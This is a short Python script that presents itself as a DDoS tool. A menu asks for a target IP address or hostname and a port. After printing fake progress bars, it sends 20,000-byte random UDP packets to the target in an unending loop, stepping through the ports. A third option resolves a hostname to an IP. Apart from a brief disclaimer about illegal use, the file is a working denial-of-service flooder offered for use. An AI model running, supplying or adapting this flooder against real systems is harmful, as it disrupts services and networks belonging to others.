import time
import socket
import random

print("Welcome, do not use this for illegal acts, I won't take the responsability of your acts!")

print("[A] Ddos with an IP adress, [B] Ddos with a host name, [C] Get a host's IP adress")
action = input("=> ")

if action == "A" or action == "a":
	ip = input("IP Adress => ")
	port = int(input("Port => "))
	pch = port
	time.sleep(1.5)
	print("[                    ] 0% ")
	time.sleep(1)
	print("[=====               ] 25%")
	time.sleep(1)
	print("[==========          ] 50%")
	time.sleep(1)
	print("[===============     ] 75%")
	time.sleep(1)
	print("[====================] 100%")
	print("Starting a Ddos attack to %s" % ip)
	time.sleep(1.5)
	run = True
	sent = 0
	while run:
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		bytes = random._urandom(20000)
		sock.sendto(bytes, (ip, port))
		sent = sent + 1
		port = port + 1
		print("Sent %s packets to %s by the port: %s" % (sent, ip, port))
		if port == 65534:
			port = pch
			
elif action == "B" or action == "b":
	bytes = random._urandom(20000)
	host = input("Host => ")
	port2 = int(input("Port => "))
	pch = port2
	ip2 = socket.gethostbyname(host)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	time.sleep(1.5)
	print("[                    ] 0% ")
	time.sleep(1)
	print("[=====               ] 25%")
	time.sleep(1)
	print("[==========          ] 50%")
	time.sleep(1)
	print("[===============     ] 75%")
	time.sleep(1)
	print("[====================] 100%")
	print("Starting a Ddos attack to %s" % ip2)
	time.sleep(1.5)
	sent = 0
	run2 = True
	while run2:
		sock.sendto(bytes, (ip2, port2))
		sent += 1
		port2 += 1
		print("Sent %s packets to %s by the port: %s" % (sent, ip2, port2))
		if port2 == 65534:
			port2 = pch
elif action == "C" or action == "c":
	host2 = input("Host => ")
	ip3 = socket.gethostbyname(host2)
	print("%s ip is %s." % (host2, ip3))

else:
	print("That choice isn't defined, try again!")